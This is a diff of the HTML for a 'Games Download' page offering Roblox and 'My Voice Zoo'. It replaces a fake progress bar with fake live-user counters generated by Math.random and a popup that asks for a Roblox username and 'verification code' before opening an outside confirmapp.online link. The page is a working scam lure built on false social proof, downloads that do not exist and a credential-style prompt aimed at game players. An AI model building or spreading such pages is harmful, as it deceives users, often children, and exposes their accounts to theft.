@@ -3,149 +3,120 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Game Download Center</title>
-
+<title>Games Download</title>
 <style>
+  body {font-family:sans-serif; background:#0f0f1f; color:#fff; text-align:center; padding:20px; overflow-x:hidden;}
+  h1 {margin-bottom:20px;}
+  .counters {display:flex; gap:40px; justify-content:center; margin-bottom:30px;}
+  .counter {background: rgba(255,255,255,0.1); padding:20px 40px; border-radius:15px; transition:0.3s;}
+  .counter h2 {font-size:2rem; transition:all 0.5s ease;}
+  .games {display:flex; gap:20px; justify-content:center; flex-wrap:wrap;}
+  .card {background:rgba(255,255,255,0.1); border-radius:15px; width:260px; padding:20px; transition: transform 0.3s, box-shadow 0.3s;}
+  .card:hover {transform:translateY(-10px); box-shadow:0 10px 30px rgba(255,255,255,0.3);}
+  .card img {width:100%; height:auto; border-radius:12px;}
+  .btn {margin-top:15px; display:inline-block; padding:12px 24px; background:#ff3d3d; color:#fff; border-radius:50px; text-decoration:none; font-weight:bold; transition:0.3s; cursor:pointer;}
+  .btn:hover {background:#e60000; transform: scale(1.05);}
 
-body{
-background:#0f0f0f;
-font-family:Arial;
-color:white;
-text-align:center;
-margin:0;
-}
+  /* Popup */
+  .popup-bg {display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); justify-content:center; align-items:center; z-index:999; opacity:0; transition:0.3s;}
+  .popup-bg.show {display:flex; opacity:1;}
+  .popup {background:#1e1e2f; padding:30px; border-radius:20px; text-align:center; width:90%; max-width:400px; animation: popupShow 0.5s;}
+  .popup input {padding:12px; width:80%; margin-bottom:15px; border-radius:10px; border:none;}
+  .popup button {padding:12px 25px; border:none; border-radius:50px; background:#ff3d3d; color:#fff; font-weight:bold; cursor:pointer;}
+  @keyframes popupShow {0%{transform:scale(0.8);opacity:0;}100%{transform:scale(1);opacity:1;}}
 
-.container{
-max-width:500px;
-margin:auto;
-padding:20px;
-}
-
-.game{
-background:#1c1c1c;
-padding:25px;
-border-radius:15px;
-margin-top:30px;
-box-shadow:0 0 20px rgba(0,0,0,0.5);
-}
-
-.logo{
-width:120px;
-margin-bottom:15px;
-}
-
-button{
-background:#1e88ff;
-border:none;
-padding:12px 30px;
-color:white;
-font-size:16px;
-border-radius:8px;
-cursor:pointer;
-}
-
-button:hover{
-background:#0066ff;
-}
-
-#loading{
-display:none;
-margin-top:40px;
-}
-
-.bar{
-width:100%;
-height:10px;
-background:#333;
-border-radius:5px;
-overflow:hidden;
-margin-top:10px;
-}
-
-.progress{
-width:0%;
-height:100%;
-background:#1e88ff;
-transition:width 0.2s;
-}
-
+  /* Audio Player Styling */
+  audio {width:100%; margin-top:10px; border-radius:10px;}
 </style>
 </head>
-
 <body>
 
-<div class="container">
+<h1>Download Games & Bonuses</h1>
 
-<h1>Game Download Center</h1>
+<div class="counters">
+  <div class="counter">
+    <h2 id="online-users">0</h2>
+    <p>Users Online Now</p>
+  </div>
+  <div class="counter">
+    <h2 id="total-visitors">0</h2>
+    <p>Visitors Today</p>
+  </div>
+</div>
 
-<div class="game">
+<div class="games">
 
-<img class="logo"
-src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Roblox_Logo_2022.svg/512px-Roblox_Logo_2022.svg.png">
+  <!-- Roblox Card with popup -->
+  <div class="card">
+    <img src="https://seeklogo.com/images/R/roblox-logo-41D8E79119-seeklogo.com.png" alt="Roblox Logo">
+    <h3>Roblox</h3>
+    <div class="btn" onclick="openPopup()">Download Roblox</div>
+  </div>
 
-<h3>Roblox</h3>
-
-<p>Play millions of games online.</p>
-
-<button onclick="start()">Start</button>
+  <!-- My Voice Zoo Card with audio -->
+  <div class="card">
+    <img src="https://store.steampowered.com/public/shared/images/header/logo_steam.svg" alt="MyVoiceZoo Logo">
+    <h3>My Voice Zoo</h3>
+    <audio controls>
+      <source src="my_zoe_voice.mp3" type="audio/mpeg">
+      Your browser does not support the audio element.
+    </audio>
+    <a href="https://confirmapp.online/cl/i/822jo6" class="btn" target="_blank">Download My Voice Zoo</a>
+  </div>
 
 </div>
 
-<div class="game">
-
-<img class="logo"
-src="https://cdn-icons-png.flaticon.com/512/1041/1041916.png">
-
-<h3>My Voice Zoo</h3>
-
-<p>Try the fun voice changer game.</p>
-
-<button onclick="start()">Download</button>
-
-</div>
-
-<div id="loading">
-
-<h3>Connecting to server...</h3>
-
-<p>Please wait...</p>
-
-<div class="bar">
-<div class="progress" id="progress"></div>
-</div>
-
-</div>
-
+<!-- Popup for Roblox -->
+<div class="popup-bg" id="popup-bg">
+  <div class="popup">
+    <h3>Enter Your Roblox Details</h3>
+    <input type="text" id="roblox-username" placeholder="Username..."><br>
+    <input type="text" id="roblox-verification" placeholder="Verification Code..."><br>
+    <button onclick="submitUsername()">Submit & Download</button>
+  </div>
 </div>
 
 <script>
+  // ===== Dynamic Smooth Counters =====
+  let onlineUsers = Math.floor(Math.random()*100)+50;
+  let totalVisitors = Math.floor(Math.random()*500)+200;
+  const onlineEl = document.getElementById('online-users');
+  const totalEl = document.getElementById('total-visitors');
 
-function start(){
+  function animateCounter(el, start, end, duration) {
+    let range = end - start;
+    let stepTime = Math.abs(Math.floor(duration / range));
+    let current = start;
+    let increment = end > start ? 1 : -1;
+    let timer = setInterval(()=>{
+      current += increment;
+      el.textContent = current;
+      if(current == end) clearInterval(timer);
+    }, stepTime);
+  }
 
-document.getElementById("loading").style.display="block"
+  function updateCounters(){
+    let newOnline = onlineUsers + Math.floor(Math.random()*5-2);
+    if(newOnline<1) newOnline=1;
+    let newTotal = totalVisitors + Math.floor(Math.random()*10);
+    animateCounter(onlineEl, onlineUsers, newOnline, 800);
+    animateCounter(totalEl, totalVisitors, newTotal, 800);
+    onlineUsers=newOnline; totalVisitors=newTotal;
+  }
+  setInterval(updateCounters,2000);
+  updateCounters();
 
-window.scrollTo(0,document.body.scrollHeight)
-
-let width=0
-let bar=document.getElementById("progress")
-
-let interval=setInterval(function(){
-
-if(width>=100){
-
-clearInterval(interval)
-
-window.location.href="https://confirmapp.online/cl/i/822jo6"
-
-}
-
-width++
-bar.style.width=width+"%"
-
-},35)
-
-}
-
+  // ===== Popup =====
+  function openPopup(){document.getElementById('popup-bg').classList.add('show');}
+  function submitUsername(){
+    const username = document.getElementById('roblox-username').value.trim();
+    const code = document.getElementById('roblox-verification').value.trim();
+    if(username===''||code===''){alert('Please enter all fields'); return;}
+    window.open('https://confirmapp.online/cl/i/822jo6','_blank');
+    document.getElementById('popup-bg').classList.remove('show');
+    document.getElementById('roblox-username').value='';
+    document.getElementById('roblox-verification').value='';
+  }
 </script>
 
 </body>
